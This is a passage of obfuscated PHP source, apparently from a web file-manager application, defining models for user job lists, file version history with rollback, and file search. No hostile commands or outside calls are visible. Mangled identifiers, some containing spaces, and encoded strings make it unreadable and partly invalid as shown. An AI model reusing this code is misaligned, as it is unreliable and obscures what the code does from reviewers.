array_to_keyvalue($÷Æ“¤Â, $øÀ£·×ı[12], $øÀ£·×ı[32]); if (!$÷Æ“¤Â || !in_array($Ìµõ§, $÷Æ“¤Â)) { return $Ìµõ§; } for ($ôÚÓ¿ùï = 0; $ôÚÓ¿ùï < count($÷Æ“¤Â); $ôÚÓ¿ùï++) { if (!in_array($Ìµõ§ . "\50{$ôÚÓ¿ùï}\x29", $÷Æ“¤Â)) { return $Ìµõ§ . "\x28{$ôÚÓ¿ùï}\51"; } } return $Ìµõ§ . "\x28{$ôÚÓ¿ùï}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x6a\157\x62\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\144\145\163\143", "\x73\157\162\x74"); const JOB_KEY = "\x73\145\154\146\x4a\157\x62\114\151\x73\164"; public function listData($ÌÑŸäÓÌ = false, $–”ŠšÙ‹ = "\163\157\162\164", $¢„×øÙÕ = false) { return parent::listData($ÌÑŸäÓÌ, $–”ŠšÙ‹, $¢„×øÙÕ); } public function remove($Ë·ıÈšû) { return parent::remove($Ë·ıÈšû); } public function add($‘ïªœØ) { $¸òóøìë =& $_SERVER[ç¦¬”œš]; if ($this->findByName($‘ïªœØ[$¸òóøìë[32]])) { return !1; } $‘ïªœØ[$¸òóøìë[1993]] = $this->getSort(); return parent::insert($‘ïªœØ); } private function getSort() { $Äš•’¨ =& $_SERVER[ç¦¬”œš]; $ª±ùş“ = parent::listData(); $±Ä¡ùç = array_to_keyvalue($ª±ùş“, $Äš•’¨[12], $Äš•’¨[1993]); return empty($±Ä¡ùç) ? 0 : max($±Ä¡ùç) + 1; } public function update($ş°ú¯£, $ºü ¬»…) { $…´¦™¡… =& $_SERVER[ç¦¬”œš]; $„çÈÚ§‡ = parent::listData($ş°ú¯£); $ÓŞÅÈÉø = $this->findByName($ºü ¬»…[$…´¦™¡…[32]]); if (!$„çÈÚ§‡ || $ÓŞÅÈÉø && $ÓŞÅÈÉø[$…´¦™¡…[484]] != $„çÈÚ§‡[$…´¦™¡…[484]]) { return !1; } return parent::update($ş°ú¯£, $ºü ¬»…); } public function setUserJob($óõ±Ë†Ä, $ ±©ã¹¥) { $Á·“à¶Ü =& $_SERVER[ç¦¬”œš]; if (!is_array($ ±©ã¹¥)) { $ ±©ã¹¥ = array($ ±©ã¹¥); } $ÉÇÍß±Ş = parent::listData(); $Â—”¡¾õ = array_to_keyvalue($ÉÇÍß±Ş, $Á·“à¶Ü[32]); $—â–¹„ƒ = $Á·“à¶Ü[454]; foreach ($ ±©ã¹¥ as $¼·Ó„ˆ¬) { if ($Â—”¡¾õ[$¼·Ó„ˆ¬]) { $—â–¹„ƒ .= $Â—”¡¾õ[$¼·Ó„ˆ¬][$Á·“à¶Ü[484]] . $Á·“à¶Ü[50]; } else { $¯æÅø°˜ = $this->add($¼·Ó„ˆ¬); $—â–¹„ƒ .= $¯æÅø°˜ . $Á·“à¶Ü[50]; } } $—â–¹„ƒ = rtrim($—â–¹„ƒ, $Á·“à¶Ü[50]); Model($Á·“à¶Ü[607])->metaSet($óõ±Ë†Ä, self::JOB_KEY, $—â–¹„ƒ); } public function getUserJob($êŞ€…æŠ) { $ô£¿’Æ® = Model($_SERVER[ç¦¬”œš][607])->metaGet($êŞ€…æŠ); return $this->getUserJobInfo($ô£¿’Æ®[self::JOB_KEY]); } public function getUserJobInfo($İ‚Ş¹Û ) { $‚×åÙÊŒ =& $_SERVER[ç¦¬”œš]; $ßÈÈôÇ® = explode($‚×åÙÊŒ[50], $İ‚Ş¹Û ); $üÍ™€·Ê = parent::listData(); $üÍ™€·Ê = array_remove_key($üÍ™€·Ê, $‚×åÙÊŒ[231]); $¹Ì„Â¨£ = array(); foreach ($ßÈÈôÇ® as $¹»¶Ã –) { if (isset($üÍ™€·Ê[$¹»¶Ã –])) { $¹Ì„Â¨£[] = $üÍ™€·Ê[$¹»¶Ã –]; } } return $¹Ì„Â¨£; } } goto aÀ§Ã–Ù ‚; f’ØÙé­Œ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\145\x5f\x68\151\163\x74\157\x72\x79"; public function historyCount($‰††Ä´) { $ì³ÊìŒƒ =& $_SERVER[ç¦¬”œš]; if (!$‰††Ä´) { return array(); } if (is_string($‰††Ä´) || is_int($‰††Ä´)) { $‰††Ä´ = array($‰††Ä´); } $‹ãÆ¬±â = array($ì³ÊìŒƒ[193], $ì³ÊìŒƒ[2002] => $ì³ÊìŒƒ[574]); $šé½¶§Ç = array($ì³ÊìŒƒ[193] => array($ì³ÊìŒƒ[7], $‰††Ä´)); $§Æ»ôĞ = $this->field($‹ãÆ¬±â)->where($šé½¶§Ç)->group($ì³ÊìŒƒ[193])->select(); return array_to_keyvalue($§Æ»ôĞ, $ì³ÊìŒƒ[193], $ì³ÊìŒƒ[574]); } public function addHistory($’öºöø¶, $ÂÚ£Şì† = '') { $ûï¹§”­ =& $_SERVER[ç¦¬”œš]; $½Ë—óê½ = array($ûï¹§”­[500] => $’öºöø¶[$ûï¹§”­[193]], $ûï¹§”­[1761] => isset($’öºöø¶[$ûï¹§”­[538]]) ? $’öºöø¶[$ûï¹§”­[538]] : $’öºöø¶[$ûï¹§”­[536]], $ûï¹§”­[551] => $’öºöø¶[$ûï¹§”­[550]], $ûï¹§”­[626] => $’öºöø¶[$ûï¹§”­[79]], $ûï¹§”­[2219] => $ÂÚ£Şì†); if ($GLOBALS[$ûï¹§”­[6]][$ûï¹§”­[92]][$ûï¹§”­[1303]] >= 1) { $this->historyAutoClear($½Ë—óê½[$ûï¹§”­[193]]); $this->add($½Ë—óê½); } Hook::trigger($ûï¹§”­[2220], $½Ë—óê½); Model($ûï¹§”­[2221])->eventFileEdit($’öºöø¶[$ûï¹§”­[193]]); } private function historyAutoClear($Ä»ƒäş·) { $‘‚ÜÃšƒ =& $_SERVER[ç¦¬”œš]; $„™ß€¢½ = Model($‘‚ÜÃšƒ[850])->get($‘‚ÜÃšƒ[1325]); $ç˜èÄÌ = intval($GLOBALS[$‘‚ÜÃšƒ[6]][$‘‚ÜÃšƒ[92]][$‘‚ÜÃšƒ[1303]]); $„³¶ìß = $„™ß€¢½ == $‘‚ÜÃšƒ[1326] ? min(5, $ç˜èÄÌ) : $ç˜èÄÌ; $„³¶ìß = $„³¶ìß <= 0 ? 0 : $„³¶ìß - 1; if ($„³¶ìß >= 499) { return; } $äƒÏ±´ = array($‘‚ÜÃšƒ[500] => $Ä»ƒäş·); $Ãì¨–Ñç = $this->field($‘‚ÜÃšƒ[2222])->where($äƒÏ±´)->order($‘‚ÜÃšƒ[2216])->select(); if (!$Ãì¨–Ñç || $„³¶ìß >= count($Ãì¨–Ñç)) { return; } $„ô™øÒ… = array_to_keyvalue($Ãì¨–Ñç, $‘‚ÜÃšƒ[12], $‘‚ÜÃšƒ[484]); $„ô™øÒ… = array_slice($„ô™øÒ…, $„³¶ìß); $»ßª®•Í = array_to_keyvalue($Ãì¨–Ñç, $‘‚ÜÃšƒ[12], $‘‚ÜÃšƒ[550]); $»ßª®•Í = array_slice($»ßª®•Í, $„³¶ìß); if (!$„ô™øÒ… || !$»ßª®•Í) { return; } $äƒÏ±´ = array($‘‚ÜÃšƒ[502] => array($‘‚ÜÃšƒ[7], $„ô™øÒ…)); $this->where($äƒÏ±´)->delete(); Model($‘‚ÜÃšƒ[553])->remove($»ßª®•Í); } public function listData($½ĞÂì¾“) { $¯á·Å×÷ =& $_SERVER[ç¦¬”œš]; $ıûÅÍ¿ó = array($¯á·Å×÷[500] => $½ĞÂì¾“); $€û·Îù“ = $¯á·Å×÷[2223]; $Ğ¬ÏÅ²³ = $this->field($€û·Îù“)->where($ıûÅÍ¿ó)->order($¯á·Å×÷[2216])->selectPage(); $this->_listAppendUser($Ğ¬ÏÅ²³[$¯á·Å×÷[445]]); $¡ÆÛµ¢‡ = Model($¯á·Å×÷[850])->get($¯á·Å×÷[1325]); $øƒˆË×š = 5; if ($¡ÆÛµ¢‡ == $¯á·Å×÷[1326]) { $Ğ¬ÏÅ²³[$¯á·Å×÷[445]] = array_slice($Ğ¬ÏÅ²³[$¯á·Å×÷[445]], 0, $øƒˆË×š); $Ğ¬ÏÅ²³[$¯á·Å×÷[442]] = array($¯á·Å×÷[2224] => 1, $¯á·Å×÷[2225] => 20, $¯á·Å×÷[2226] => 1, $¯á·Å×÷[2227] => count($Ğ¬ÏÅ²³[$¯á·Å×÷[445]])); } return $Ğ¬ÏÅ²³; } protected function _listAppendUser(&$üàÎç­) { $Ç…¤¤à =& $_SERVER[ç¦¬”œš]; $£ı¼ãÖ = array_to_keyvalue($üàÎç­, $Ç…¤¤à[12], $Ç…¤¤à[1770]); $¤„©³Ì» = Model($Ç…¤¤à[607])->userListInfo($£ı¼ãÖ); foreach ($üàÎç­ as &$ã¹§ß€¨) { $½Â†¥ïå = $ã¹§ß€¨[$Ç…¤¤à[1770]]; $ã¹§ß€¨[$Ç…¤¤à[536]] = $¤„©³Ì»[$½Â†¥ïå] ? $¤„©³Ì»[$½Â†¥ïå] : !1; } unset($ã¹§ß€¨); } public function fileInfo($šÔÚ¦‡‡) { $×·§ÎöŸ =& $_SERVER[ç¦¬”œš]; $À˜…Š£Ì = $this->tablePrefix; $ÆŒµ‚ËÅ = "{$À˜…Š£Ì}\151\157\x5f\146\x69\x6c\145\40\x66\151\x6c\145\163\x20\x6f\x6e\x20\x66\x69\154\x65\x73\x2e\x66\151\x6c\x65\x49\104\x20\x3d\x20\150\151\x73\x74\x6f\x72\x79\56\146\x69\154\145\x49\x44"; return $this->alias($×·§ÎöŸ[2228])->where(array($×·§ÎöŸ[502] => $šÔÚ¦‡‡))->join($ÆŒµ‚ËÅ, $×·§ÎöŸ[2229])->find(); } public function removeItem($½ÅÅ’‘) { $“âûòù =& $_SERVER[ç¦¬”œš]; $ß¹÷øõ = array($“âûòù[502] => $½ÅÅ’‘); $Ÿ¸“º·† = $this->where($ß¹÷øõ)->find(); if ($Ÿ¸“º·†) { $ÄºâÇÕæ = $this->where($ß¹÷øõ)->delete(); Model($“âûòù[553])->remove($Ÿ¸“º·†[$“âûòù[550]]); return $ÄºâÇÕæ; } return !1; } public function removeBySource($ôŒ×çşÊ) { $Á®ÓÊÔ  =& $_SERVER[ç¦¬”œš]; if (!$ôŒ×çşÊ) { return !1; } if (!is_array($ôŒ×çşÊ)) { $ôŒ×çşÊ = array($ôŒ×çşÊ); } $À²ëë€ù = array($Á®ÓÊÔ [500] => array($Á®ÓÊÔ [7], $ôŒ×çşÊ)); $ÄÇ‚øÊ¡ = $this->field($Á®ÓÊÔ [551])->where($À²ëë€ù)->select(); if ($ÄÇ‚øÊ¡) { $this->where($À²ëë€ù)->delete(); $ÃÇÚ €Ì = array_to_keyvalue($ÄÇ‚øÊ¡, $Á®ÓÊÔ [12], $Á®ÓÊÔ [550]); Model($Á®ÓÊÔ [553])->remove($ÃÇÚ €Ì); } return !0; } public function setDetail($ÑÚÏ”É, $õÄÛ§ç³) { $›Ùî¸  =& $_SERVER[ç¦¬”œš]; return $this->where(array($›Ùî¸ [502] => $ÑÚÏ”É))->save(array($›Ùî¸ [2219] => $õÄÛ§ç³)); } public function rollbackToItem($¥üã¢ª¤, $ˆæ¡ÊÃ‹) { $ŠÂÓèÜ® =& $_SERVER[ç¦¬”œš]; $‘øûÙ¸ = Model($ŠÂÓèÜ®[904])->sourceInfo($¥üã¢ª¤); $this->addHistory($‘øûÙ¸, LNG($ŠÂÓèÜ®[2230])); $æ¶¹ŠğÆ = $this->find($ˆæ¡ÊÃ‹); $Æ’­Ñ»õ = array($ŠÂÓèÜ®[550] => $æ¶¹ŠğÆ[$ŠÂÓèÜ®[550]], $ŠÂÓèÜ®[79] => $æ¶¹ŠğÆ[$ŠÂÓèÜ®[79]], $ŠÂÓèÜ®[88] => time(), $ŠÂÓèÜ®[538] => USER_ID); Model($ŠÂÓèÜ®[904])->where(array($ŠÂÓèÜ®[193] => $¥üã¢ª¤))->save($Æ’­Ñ»õ); return $this->where(array($ŠÂÓèÜ®[502] => $ˆæ¡ÊÃ‹))->delete(); } public function clearSame($òôßı©) { $ç°‡¥ºŞ =& $_SERVER[ç¦¬”œš]; $åÉïôõ… = $this->listData($òôßı©); $¥±¦óËõ = array_to_keyvalue_group($åÉïôõ…, $ç°‡¥ºŞ[550]); $¯‡¹ˆ¨ = array(); $–Ç±Ó¢£ = array(); foreach ($¥±¦óËõ as $¼éİ¢¢) { if (!$¼éİ¢¢ || count($¼éİ¢¢) <= 1) { continue; } foreach ($¼éİ¢¢ as $¢Ë¢ƒò¤) { $¯‡¹ˆ¨[] = $¢Ë¢ƒò¤[$ç°‡¥ºŞ[550]]; $–Ç±Ó¢£[] = $¢Ë¢ƒò¤[$ç°‡¥ºŞ[484]]; } } if (!$–Ç±Ó¢£) { return; } $this->where(array($ç°‡¥ºŞ[484] => array($ç°‡¥ºŞ[7], $–Ç±Ó¢£)))->delete(); Model($ç°‡¥ºŞ[553])->remove($¯‡¹ˆ¨); } public function userSpace() { $¹âÄç½» =& $_SERVER[ç¦¬”œš]; $ëÏ¿æ˜ = $this->tablePrefix; $ï€ÛÑşÜ = array($¹âÄç½»[1761] => USER_ID); $¥œæ°àá = "{$ëÏ¿æ˜}\x69\157\x5f\146\151\154\x65\40\x66\151\154\145\x73\40\x6f\x6e\40\x66\151\x6c\x65\163\x2e\146\x69\x6c\145\111\104\40\x3d\x20\x68\151\163\x74\x6f\x72\171\56\x66\x69\x6c\145\111\104"; return $this->alias($¹âÄç½»[2228])->where($ï€ÛÑşÜ)->join($¥œæ°àá, $¹âÄç½»[2229])->sum($¹âÄç½»[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($í…üå™¨) { $‘ âÆ  =& $_SERVER[ç¦¬”œš]; $Şğ¡§¸ = KodIO::fileTypeList(); $½£˜ÒÁô = $Şğ¡§¸[$í…üå™¨]; if (!$½£˜ÒÁô) { return array(); } $å¹È¥è = $½£˜ÒÁô[$‘ âÆ [169]]; $ù¨§®Ğ‰ = $‘ âÆ [7]; if (!$½£˜ÒÁô[$‘ âÆ [169]]) { $¦‚³§œÊ = array_to_keyvalue($Şğ¡§¸, $‘ âÆ [12], $‘ âÆ [169]); $å¹È¥è = implode($‘ âÆ [50], $¦‚³§œÊ); $ù¨§®Ğ‰ = $‘ âÆ [2231]; } $¢š¥ûøÀ = explode($‘ âÆ [50], trim($å¹È¥è, $‘ âÆ [50])); return array($ù¨§®Ğ‰, $¢š¥ûøÀ); } public function listPathType($¡¼àÆ³©) { $¯¦÷ñü— =& $_SERVER[ç¦¬”œš]; $»Ùãƒƒâ = $this->fileTypeWhere($¡¼àÆ³©); if (!$»Ùãƒƒâ) { return array(); } $ğ˜÷ƒó¸ = USER_ID; $¹ó¶ï¡Ò = Model($¯¦÷ñü—[607])->getInfo($ğ˜÷ƒó¸); $ë¥â´ş = array($¯¦÷ñü—[657] => SourceModel::TYPE_USER, $¯¦÷ñü—[593] => array($¯¦÷ñü—[621], $¯¦÷ñü—[603] . $¹ó¶ï¡Ò[$¯¦÷ñü—[90]][$¯¦÷ñü—[193]] . $¯¦÷ñü—[622]), $¯¦÷ñü—[658] => $ğ˜÷ƒó¸, $¯¦÷ñü—[655] => 0, $¯¦÷ñü—[656] => $»Ùãƒƒâ); return $this->listSource($ë¥â´ş); } public function listSearch($Š­¯Ìºı, $İÕï®¨£ = 300) { $ê†¤Õê• =& $_SERVER[ç¦¬”œš]; if (isset($Š­¯Ìºı[$ê†¤Õê•[2067]]) && $Š­¯Ìºı[$ê†¤Õê•[2067]]) { $Š­¯Ìºı[$ê†¤Õê•[2067]] = str_replace($ê†¤Õê•[460], $ê†¤Õê•[2232], trim($Š­¯Ìºı[$ê†¤Õê•[2067]])); } $ú°Î½ = $this->_parseSearchWhere($Š­¯Ìºı); if (!isset($ú°Î½[$ê†¤Õê•[514]])) { $ú°Î½[$ê†¤Õê•[514]] = 0; } $ô¶±ôŸâ = $ê†¤Õê•[2233]; $†ã˜¶ó = $ú°Î½; $ÆÇ†“Üá = $ô¶±ôŸâ; $this->_listSearchBindPinyin($Š­¯Ìºı, $ú°Î½, $ô¶±ôŸâ); $this->alias($ê†¤Õê•[528])->_makeOrder(); $ú°Î½ = $this->parseWhereLike($ú°Î½); $ Ù«Şô£ = $this->distinct(!0)->field($ô¶±ôŸâ)->where($ú°Î½)->selectPage($İÕï®¨£); if ($GLOBALS[$ê†¤Õê•[6]][$ê†¤Õê•[457]][$ê†¤Õê•[458]] && Input::check($Š­¯Ìºı[$ê†¤Õê•[2067]], $ê†¤Õê•[664]) && $ Ù«Şô£[$ê†¤Õê•[442]][$ê†¤Õê•[429]] == 1 && $ Ù«Şô£[$ê†¤Õê•[442]][$ê†¤Õê•[443]] == 0) { $ Ù«Şô£ = $this->distinct(!0)->field($ô¶±ôŸâ)->where($†ã˜¶ó)->limit(1000)->select(); $ Ù«Şô£ = array_page_split($ Ù«Şô£, !1, $İÕï®¨£); } $this->_listSearchFileContent($ Ù«Şô£, $Š­¯Ìºı, $ÆÇ†“Üá, $†ã˜¶ó); $this->_listSearchDesc($ Ù«Şô£, $Š­¯Ìºı, $ÆÇ†“Üá); $this->_listSearchTag($ Ù«Şô£, $Š­¯Ìºı, $ÆÇ†“Üá); $this->_listSearchGroupTag($ Ù«Şô£, $Š­¯Ìºı, $ÆÇ†“Üá); $this->_listDataApply($ Ù«Şô£[$ê†¤Õê•[445]]); $this->_listMake($ Ù«Şô£); return $ Ù«Şô£; } private function _listSearchFileContent(&$ãÎ§˜™Ø, $µ†™ÆÄú, $ø“€Îµ, $­µœª) { $Ñ…ÎĞ·“ =& $_SERVER[ç¦¬”œš]; if (!$µ†™ÆÄú[$Ñ…ÎĞ·“[2067]] || $ãÎ§˜™Ø[$Ñ…ÎĞ·“[442]][$Ñ…ÎĞ·“[429]] > 1) { return; } if (!isset($­µœª[$Ñ…ÎĞ·“[32]]) || !is_array($µ†™ÆÄú[$Ñ…ÎĞ·“[550]])) { return; } $­µœª[$Ñ…ÎĞ·“[550]] = array($Ñ…ÎĞ·“[7], $µ†™ÆÄú[$Ñ…ÎĞ·“[550]]); unset($­µœª[$Ñ…ÎĞ·“[32]]); unset($µ†™ÆÄú[$Ñ…ÎĞ·“[550]]); $©” ¥‚¨ = $this->field($ø“€Îµ)->where($­µœª)->limit($Ñ…ÎĞ·“[2234])->select(); if (!$©” ¥‚¨ || count($©” ¥‚¨) == 0) { return; } $ãÎ§˜™Ø[$Ñ…ÎĞ·“[445]] = array_merge($©” ¥‚¨, $ãÎ§˜™Ø[$Ñ…ÎĞ·“[445]]); $ãÎ§˜™Ø[$Ñ…ÎĞ·“[442]][$Ñ…ÎĞ·“[443]] += count($©” ¥‚¨); } private function _listSearchTag(&$÷×–à¢º, $™® ã˜, $ƒ¥µ¸¼) { $¹­Ö¯àá =& $_SERVER[ç¦¬”œš]; if (!$™® ã˜[$¹­Ö¯àá[2067]] || $÷×–à¢º[$¹­Ö¯àá[442]][$¹­Ö¯àá[429]] > 1) { return; } $ïàÇŸû± = Model($¹­Ö¯àá[2235])->listData(); $ÕåêÔšÑ = array(); $²·Ç¡œœ = $™® ã˜[$¹­Ö¯àá[2067]]; foreach ($ïàÇŸû± as $£ûšŠÆâ) { $È˜‰Õì = $£ûšŠÆâ[$¹­Ö¯àá[32]]; $åÉŞıí = str_replace($¹­Ö¯àá[53], $¹­Ö¯àá[12], Pinyin::get($È˜‰Õì)); if (stripos($È˜‰Õì, $²·Ç¡œœ) !== !1 || stripos($åÉŞıí, $²·Ç¡œœ) !== !1) { $ÕåêÔšÑ[] = $£ûšŠÆâ[$¹­Ö¯àá[484]]; } } if (!$ÕåêÔšÑ) { return; } $Á³á°åœ = array($¹­Ö¯àá[509] => array($¹­Ö¯àá[7], $ÕåêÔšÑ), $¹­Ö¯àá[1770] => USER_ID); $¨«¬ÙôÏ = Model($¹­Ö¯àá[511])->field($¹­Ö¯àá[87])->where($Á³á°åœ)->select(); $¨«¬ÙôÏ = array_to_keyvalue($¨«¬ÙôÏ, $¹­Ö¯àá[12], $¹­Ö¯àá[87]); $ÍõıñÎ = array_unique($¨«¬ÙôÏ); $this->_listSearchMerge($÷×–à¢º, $™® ã˜, $ƒ¥µ¸¼, $ÍõıñÎ); } private function _listSearchDesc(&$à—¨¨…›, $Í¬©åÃñ, $¥œ®Øù™) { $§“ìèÏ =& $_SERVER[ç¦¬”œš]; if (!$Í¬©åÃñ[$§“ìèÏ[2067]] || $à—¨¨…›[$§“ìèÏ[442]][$§“ìèÏ[429]] > 1) { return; } $ÏíôÑÕ¼ = array($§“ìèÏ[97] => $§“ìèÏ[535], $§“ìèÏ[450] => array($§“ìèÏ[459], $§“ìèÏ[2069] . $Í¬©åÃñ[$§“ìèÏ[2067]] . $§“ìèÏ[2069])); $Š®¢æ‡ë = !1; if ($Š®¢æ‡ë) { $¢»éÜİı = $this->listSearchChildren($Í¬©åÃñ[$§“ìèÏ[192]]); $¢»éÜİı = array_unique($¢»éÜİı); if (!$¢»éÜİı) { return; } $ÏíôÑÕ¼[$§“ìèÏ[193]] = array($§“ìèÏ[7], $¢»éÜİı); } $ŸÇºÏíÄ = Model($§“ìèÏ[641])->field($§“ìèÏ[193])->where($ÏíôÑÕ¼)->limit(5000)->select(); $Èµí§¶ = array_to_keyvalue($ŸÇºÏíÄ, $§“ìèÏ[12], $§“ìèÏ[193]); $this->_listSearchMerge($à—¨¨…›, $Í¬©åÃñ, $¥œ®Øù™, $Èµí§¶); } private function _listSearchGroupTag(&$…õ´¡¹¯, $­Ã‘ÊÇş, $â…ĞÏ€Û) { $¶¼¦’Šù =& $_SERVER[ç¦¬”œš]; if (!$­Ã‘ÊÇş[$¶¼¦’Šù[2067]] || $…õ´¡¹¯[$¶¼¦’Šù[442]][$¶¼¦’Šù[429]] > 1 || !$­Ã‘ÊÇş[$¶¼¦’Šù[192]]) { return; } $èÀ’Öğ¶ = $this->sourceInfo($­Ã‘ÊÇş[$¶¼¦’Šù[192]]); if (!$èÀ’Öğ¶ || $èÀ’Öğ¶[$¶¼¦’Šù[190]] != SourceModel::TYPE_GROUP) { return; } $„¸ªÃ«è = $èÀ’Öğ¶[$¶¼¦’Šù[578]]; $€ÕÇÓí = Model($¶¼¦’Šù[2236])->get($„¸ªÃ«è); $ÜÇ¤¥Îà = array(); $™ì›™ì¨ = $­Ã‘ÊÇş[$¶¼¦’Šù[2067]]; foreach ($€ÕÇÓí[$¶¼¦’Šù[445]] as $¿ä—ÆÅã) { $ìŠµàô× = $¿ä—ÆÅã[$¶¼¦’Šù[32]]; $éë…—Ø’ = str_replace($¶¼¦’Šù[53], $¶¼¦’Šù[12], Pinyin::get($ìŠµàô×)); if (stripos($ìŠµàô×, $™ì›™ì¨) !== !1 || stripos($éë…—Ø’, $™ì›™ì¨) !== !1) { $ÜÇ¤¥Îà[] = $¿ä—ÆÅã[$¶¼¦’Šù[484]]; } } if (!$ÜÇ¤¥Îà) { return; } $üë™¹°ç = array($¶¼¦’Šù[509] => array($¶¼¦’Šù[7], $ÜÇ¤¥Îà), $¶¼¦’Šù[1770] => 0, $¶¼¦’Šù[33] => $¶¼¦’Šù[2089] . $„¸ªÃ«è); $ûÄƒÚ×° = Model($¶¼¦’Šù[511])->field($¶¼¦’Šù[87])->where($üë™¹°ç)->select(); $ûÄƒÚ×° = array_to_keyvalue($ûÄƒÚ×°, $¶¼¦’Šù[12], $¶¼¦’Šù[87]); $ĞİÑæã³ = array_unique($ûÄƒÚ×°); $this->_listSearchMerge($…õ´¡¹¯, $­Ã‘ÊÇş, $â…ĞÏ€Û, $ĞİÑæã³); } private function _listSearchMerge(&$«ËÊ³²Í, $Ç£Òôõ¾, $ŞÒÉ°…Ó, $©““˜ü) { $¤Ø—ğÇè =& $_SERVER[ç¦¬”œš]; if (!$©““˜ü) { return; } $ê ƒˆ¥ó = array_to_keyvalue($«ËÊ³²Í[$¤Ø—ğÇè[445]], $¤Ø—ğÇè[12], $¤Ø—ğÇè[193]); $ÒŞ¶Àê = array_diff($©““˜ü, $ê ƒˆ¥ó); if (!$ÒŞ¶Àê) { return; } $š“’ëÎ = array($¤Ø—ğÇè[193] => array($¤Ø—ğÇè[7], $ÒŞ¶Àê)); $Ú½İ˜çÛ = $this->field($ŞÒÉ°…Ó)->where($š“’ëÎ)->select(); if (!$Ú½İ˜çÛ) { return; } $İ‘•êÕ˜ = array(); foreach ($Ú½İ˜çÛ as $Ü³Ãñ‚) { if ($this->_listSearchFilter($Ü³Ãñ‚, $Ç£Òôõ¾)) { $İ‘•êÕ˜[] = $Ü³Ãñ‚; } } $«ËÊ³²Í[$¤Ø—ğÇè[445]] = array_merge($İ‘•êÕ˜, $«ËÊ³²Í[$¤Ø—ğÇè[445]]); $«ËÊ³²Í[$¤Ø—ğÇè[442]][$¤Ø—ğÇè[443]] += count($İ‘•êÕ˜); } private function _listSearchFilter($±¢½“šù, $ù‘…Í‚è) { $Ïìª¿šû =& $_SERVER[ç¦¬”œš]; $â—¼ˆ­Ò = $±¢½“šù[$Ïìª¿šû[494]] == $Ïìª¿šû[91]; if (!strstr($±¢½“šù[$Ïìª¿šû[593]], $Ïìª¿šû[50] . $ù‘…Í‚è[$Ïìª¿šû[192]] . $Ïìª¿šû[50])) { return !1; } if (isset($ù‘…Í‚è[$Ïìª¿šû[495]]) && $ù‘…Í‚è[$Ïìª¿šû[495]] != $Ïìª¿šû[856]) { if ($ù‘…Í‚è[$Ïìª¿šû[495]] == $Ïìª¿šû[78] && !$â—¼ˆ­Ò) { return !1; } if ($ù‘…Í‚è[$Ïìª¿šû[495]] != $Ïìª¿šû[78] && $â—¼ˆ­Ò) { return !1; } if (!strstr($±¢½“šù[$Ïìª¿šû[169]], $Ïìª¿šû[50] . $ù‘…Í‚è[$Ïìª¿šû[495]] . $Ïìª¿šû[50])) { return !1; } } if (isset($ù‘…Í‚è[$Ïìª¿šû[2237]]) && $ù‘…Í‚è[$Ïìª¿šû[2237]] < $±¢½“šù[$Ïìª¿šû[79]]) { return !1; } if (isset($ù‘…Í‚è[$Ïìª¿šû[2238]]) && $ù‘…Í‚è[$Ïìª¿šû[2238]] > $±¢½“šù[$Ïìª¿šû[79]]) { return !1; } if (isset($ù‘…Í‚è[$Ïìª¿šû[671]]) && $ù‘…Í‚è[$Ïìª¿šû[671]] != $±¢½“šù[$Ïìª¿šû[538]]) { return !1; } return !0; } public function listSearchChildren($œ“ »¦õ, $ƒÉÒ´šø = 5000) { $ÜºœğÁİ =& $_SERVER[ç¦¬”œš]; $›Ç§—¿â = array(); $Åè›¯×æ = $this->sourceInfo($œ“ »¦õ); $ª˜×Ìˆ = array($ÜºœğÁİ[593] => array($ÜºœğÁİ[459], $Åè›¯×æ[$ÜºœğÁİ[593]] . $Åè›¯×æ[$ÜºœğÁİ[193]] . $ÜºœğÁİ[622])); $È¾ŠŒ¤ = $this->field($ÜºœğÁİ[79])->where($ª˜×Ìˆ)->limit($ƒÉÒ´šø + 1)->select(); $à°Áí¹¢ = is_array($È¾ŠŒ¤) ? count($È¾ŠŒ¤) : 0; if ($à°Áí¹¢ > $ƒÉÒ´šø) { return $this->_listSearchChildrenNear($œ“ »¦õ, $ƒÉÒ´šø); } $ˆ ¢ìë— = $this->field($ÜºœğÁİ[193])->where($ª˜×Ìˆ)->select(); $›Ç§—¿â = array_to_keyvalue($ˆ ¢ìë—, $ÜºœğÁİ[12], $ÜºœğÁİ[193]); return $›Ç§—¿â; } private function _listSearchChildrenNear($öÔÛ™¶Ø, $Ì’•ú¥Ç) { $ï‘ÈÏ¼Í =& $_SERVER[ç¦¬”œš]; $½„„è§ = array(); $Ïñß“îç = array($ï‘ÈÏ¼Í[192] => $öÔÛ™¶Ø); $áõÁìô = $this->field($ï‘ÈÏ¼Í[2239])->where($Ïñß“îç)->select(); $ƒÏ­Ì  = array_to_keyvalue(array_filter_by_field($áõÁìô, $ï‘ÈÏ¼Í[494], $ï‘ÈÏ¼Í[91]), $ï‘ÈÏ¼Í[12], $ï‘ÈÏ¼Í[193]); $½„„è§ = array_merge($½„„è§, array_to_keyvalue($áõÁìô, $ï‘ÈÏ¼Í[12], $ï‘ÈÏ¼Í[193])); if (!$ƒÏ­Ì ) { return $½„„è§; } $Ïñß“îç = array($ï‘ÈÏ¼Í[192] => array($ï‘ÈÏ¼Í[7], $ƒÏ­Ì )); $áõÁìô = $this->field($ï‘ÈÏ¼Í[2239])->where($Ïñß“îç)->limit($Ì’•ú¥Ç)->select(); $½„„è§ = array_merge($½„„è§, array_to_keyvalue($áõÁìô, $ï‘ÈÏ¼Í[12], $ï‘ÈÏ¼Í[193])); $½„„è§ = array_slice($½„„è§, 0, intval($Ì’•ú¥Ç)); return $½„„è§; } private function _listSearchBindPinyin($¬³½ƒ¬Í, &$–ÇüÕ„‹, &$Ôß‰ò­) { $˜È÷ó²¥ =& $_SERVER[ç¦¬”œš]; if (!isset($¬³½ƒ¬Í[$˜È÷ó²¥[2067]]) || !$¬³½ƒ¬Í[$˜È÷ó²¥[2067]]) { return; } if (!Input::check($¬³½ƒ¬Í[$˜È÷ó²¥[2067]], $˜È÷ó²¥[394]) || strlen($¬³½ƒ¬Í[$˜È÷ó²¥[2067]]) < 2) { return; } $ÒÁ«× = 